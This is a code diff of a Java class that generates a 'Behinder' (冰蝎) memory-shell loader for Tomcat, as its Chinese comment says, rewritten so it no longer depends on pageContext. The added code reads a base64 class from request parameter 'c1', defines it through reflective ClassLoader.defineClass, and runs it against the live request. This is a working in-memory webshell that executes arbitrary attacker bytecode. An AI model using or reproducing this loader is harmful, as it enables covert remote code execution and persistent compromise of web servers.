@@ -6,20 +6,20 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
 import org.apache.coyote.RequestInfo;
-import sun.misc.BASE64Decoder;
 
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
 import javax.servlet.jsp.PageContext;
-import java.lang.reflect.Method;
 
-public class Loader {
+
+/**
+ * 新版冰蝎loader，不依赖pageContent
+ */
+public class Loader1 {
 
     public static byte[] getPayload() throws Exception {
         ClassPool classPool = ClassPool.getDefault();
         classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
         classPool.insertClassPath(new ClassClassPath(RequestInfo.class));
-        classPool.insertClassPath(new ClassClassPath(javax.servlet.jsp.PageContext.class));
+        classPool.insertClassPath(new ClassClassPath(PageContext.class));
         classPool.insertClassPath(new ClassClassPath(MemBehinder3.class));
 
         CtClass ctClass = classPool.makeClass("BehinderLoader"+ System.nanoTime());
@@ -75,37 +75,24 @@ public class Loader {
                 "                                    org.apache.catalina.connector.Response response = request.getResponse();\n" +
                 "                                    javax.servlet.http.HttpSession session = request.getSession();\n" +
 
-                "                                    String c1 = null;\n" +
-                "                                    String c2 = null;\n" +
-                "                                    if (request.getParameter(\"c1\") != null){\n" +
-                "                                        c1 = (String)request.getParameter(\"c1\");\n" +
-                "                                    }\n" +
-                "                                    if (request.getParameter(\"c2\") != null){\n" +
-                "                                        c2 = (String)request.getParameter(\"c2\");\n" +
-                "                                    }\n" +
-                "\n" +
-                "                                    if (c1 != null&&c2!=null){\n" +
+                "                                     String  c1 = (String)request.getParameter(\"c1\");\n" +
+
+                "                                    if (c1 != null){\n" +
                 "                                            try {\n" +
-        "                                                       byte[] var14 = java.util.Base64.getDecoder().decode(c1);\n" +
-                "                                               java.lang.reflect.Method var15 = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class, int.class});\n" +
-        "                                                       var15.setAccessible(true);\n" +
-                "                                               Class var16 = (Class) var15.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{var14,new Integer(0), new Integer(var14.length)});\n"+
-                "                                               var16.newInstance();\n"+
-        "                                                       byte[] var18 = java.util.Base64.getDecoder().decode(c2);\n" +
-        "                                                       java.lang.reflect.Method var19 = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class, int.class});\n" +
-        "                                                       var19.setAccessible(true);\n" +
-        "                                                       Class var20 = (Class)var19.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{var18, new Integer(0), new Integer(var18.length)});\n" +
-        "                                                      // var20.newInstance();\n"+
-                "                                               //java.lang.reflect.Field f = var20.getClass().getDeclaredField(\"pageContext\");\n" +
-                "                                               //f.setAccessible(true);\n" +
-                "                                               //f.set(var20,var16.getConstructor(javax.servlet.ServletRequest.class, javax.servlet.ServletResponse.class).newInstance(request.getRequest(), request.getResponse().getResponse()));"+
-        "                                                       var20.getConstructor(var16.getClass()).newInstance(var16.getConstructor(javax.servlet.ServletRequest.class, javax.servlet.ServletResponse.class).newInstance(request.getRequest(), request.getResponse().getResponse())).equals(request);;\n" +
-        "                                                   } catch (Exception var21) {\n" +
-        "                                                       var21.printStackTrace();\n" +
-        "                                                   }\n" +
+                "                                                       byte[] cdata = java.util.Base64.getDecoder().decode(c1);\n" +
+                "                                                       java.lang.reflect.Method met = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class, int.class});\n" +
+                "                                                       met.setAccessible(true);\n" +
+                "                                                       Class var20 = (Class)met.invoke(Thread.currentThread().getContextClassLoader(), new Object[]{cdata, new Integer(0), new Integer(cdata.length)});\n" +
+                "                                                       var20.newInstance().equals(request);\n" +
+                "                                                   } catch (Exception var21) {\n" +
+                "                                                       var21.printStackTrace();\n" +
+                "                                                   }\n" +
+                "                                    }\n" +
+
+                "\n" +
+
                 "                                        flag = true;\n" +
                 "                                        break;\n" +
-                "                                    }\n" +
                 "                                    if (flag){\n" +
                 "                                        break;\n" +
                 "                                    }\n" +
